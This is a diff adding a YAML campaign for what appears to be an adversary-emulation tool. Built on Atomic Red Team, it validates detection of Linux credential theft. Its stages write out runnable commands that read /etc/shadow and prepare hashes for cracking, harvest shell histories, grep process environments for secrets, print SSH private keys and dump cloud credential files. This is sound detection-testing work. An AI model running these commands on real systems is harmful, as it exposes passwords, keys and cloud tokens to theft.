@@ -1,0 +1,146 @@
+api_version: v1
+kind: Campaign
+
+meta:
+  name: art-credential-access-linux
+  adversary: Atomic Red Team
+  description: "Real credential access techniques on Linux — /etc/shadow, history files, memory dumps, key extraction"
+  objective: "Execute real credential harvesting to validate detection of Linux credential theft"
+  mitre_version: "15.1"
+  severity: critical
+  tags: [art, atomic-red-team, credential-access, linux, live-execution]
+  authors: ["ThreatEcho"]
+  references:
+    - https://github.com/redcanaryco/atomic-red-team
+    - https://attack.mitre.org/tactics/TA0006/
+  created: "2024-08-15"
+  modified: "2026-09-14"
+
+stages:
+  - id: shadow-read
+    name: "Shadow File Access"
+    description: "Read /etc/shadow to extract password hashes — requires root"
+    technique: T1003.008
+    tactic: credential-access
+    platform: [linux]
+    execute:
+      type: shell
+      commands:
+        - 'cat /etc/shadow'
+        - 'cat /etc/shadow | cut -d: -f1,2'
+      elevated: true
+    expect:
+      telemetry: [file_read]
+      detections: [shadow_file_access, credential_file_read, password_hash_extraction]
+    on_success: passwd-shadow-unshadow
+    on_failure: continue
+    timeout: 10s
+
+  - id: passwd-shadow-unshadow
+    name: "Unshadow for Offline Cracking"
+    description: "Combine passwd and shadow for offline password cracking with John/Hashcat"
+    technique: T1003.008
+    tactic: credential-access
+    platform: [linux]
+    depends_on: [shadow-read]
+    execute:
+      type: shell
+      commands:
+        - 'unshadow /etc/passwd /etc/shadow > /tmp/threatecho_unshadowed.txt 2>/dev/null || paste -d: /etc/passwd /etc/shadow > /tmp/threatecho_unshadowed.txt 2>/dev/null || echo "unshadow failed — no tool available"'
+        - 'head -5 /tmp/threatecho_unshadowed.txt 2>/dev/null'
+      elevated: true
+      cleanup:
+        - 'rm -f /tmp/threatecho_unshadowed.txt'
+    expect:
+      telemetry: [process_create, file_read, file_write]
+      detections: [unshadow_execution, credential_extraction, offline_cracking_prep]
+    on_success: history-harvest
+    on_failure: continue
+    timeout: 10s
+
+  - id: history-harvest
+    name: "Shell History Harvesting"
+    description: "Extract shell history files — may contain passwords, tokens, and API keys typed on the command line"
+    technique: T1552.003
+    tactic: credential-access
+    platform: [linux]
+    depends_on: [passwd-shadow-unshadow]
+    execute:
+      type: shell
+      commands:
+        - 'cat ~/.bash_history 2>/dev/null | tail -50'
+        - 'cat /home/*/.bash_history 2>/dev/null | tail -50'
+        - 'cat /root/.bash_history 2>/dev/null | tail -50'
+        - 'cat ~/.zsh_history 2>/dev/null | tail -50'
+        - 'find /home -name ".bash_history" -o -name ".zsh_history" -o -name ".python_history" 2>/dev/null'
+      elevated: false
+    expect:
+      telemetry: [file_read]
+      detections: [history_file_access, credential_harvesting, sensitive_file_read]
+    on_success: proc-memory
+    on_failure: continue
+    timeout: 15s
+
+  - id: proc-memory
+    name: "Process Memory Credential Extraction"
+    description: "Dump process memory to search for cleartext credentials — targets web servers, databases, SSH agents"
+    technique: T1003
+    tactic: credential-access
+    platform: [linux]
+    depends_on: [history-harvest]
+    execute:
+      type: shell
+      commands:
+        - 'strings /proc/*/environ 2>/dev/null | grep -iE "password|passwd|token|secret|key|api" | head -20 || echo "no matches in process environ"'
+        - 'cat /proc/*/cmdline 2>/dev/null | tr "\0" " " | grep -iE "password|passwd|-p " | head -10 || echo "no password args in cmdline"'
+      elevated: true
+    expect:
+      telemetry: [file_read]
+      detections: [proc_memory_access, credential_in_memory, process_environ_read]
+    on_success: ssh-key-theft
+    on_failure: continue
+    timeout: 15s
+
+  - id: ssh-key-theft
+    name: "SSH Private Key Theft"
+    description: "Locate and read SSH private keys for lateral movement"
+    technique: T1552.004
+    tactic: credential-access
+    platform: [linux]
+    depends_on: [proc-memory]
+    execute:
+      type: shell
+      commands:
+        - 'find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "id_dsa" 2>/dev/null'
+        - 'for f in $(find /home /root -name "id_rsa" -o -name "id_ed25519" 2>/dev/null); do echo "=== $f ==="; head -2 "$f"; echo "..."; done'
+        - 'find / -name "*.pem" -o -name "*.key" 2>/dev/null | head -15'
+      elevated: true
+    expect:
+      telemetry: [file_read]
+      detections: [ssh_key_access, private_key_read, credential_file_access]
+    on_success: cloud-creds
+    on_failure: continue
+    timeout: 15s
+
+  - id: cloud-creds
+    name: "Cloud Credential Discovery"
+    description: "Locate AWS, GCP, Azure credential files and environment variables"
+    technique: T1552.001
+    tactic: credential-access
+    platform: [linux]
+    depends_on: [ssh-key-theft]
+    execute:
+      type: shell
+      commands:
+        - 'cat ~/.aws/credentials 2>/dev/null || echo "no AWS credentials file"'
+        - 'cat ~/.aws/config 2>/dev/null || echo "no AWS config"'
+        - 'ls -la ~/.config/gcloud/ 2>/dev/null || echo "no GCP config"'
+        - 'cat ~/.azure/accessTokens.json 2>/dev/null || echo "no Azure tokens"'
+        - 'env | grep -iE "AWS_|AZURE_|GCP_|GOOGLE_" || echo "no cloud env vars"'
+        - 'find /home /root -name ".env" -o -name "*.env" 2>/dev/null | head -10'
+      elevated: false
+    expect:
+      telemetry: [file_read]
+      detections: [cloud_credential_access, sensitive_file_read, credential_file_enumeration]
+    on_failure: continue
+    timeout: 15s
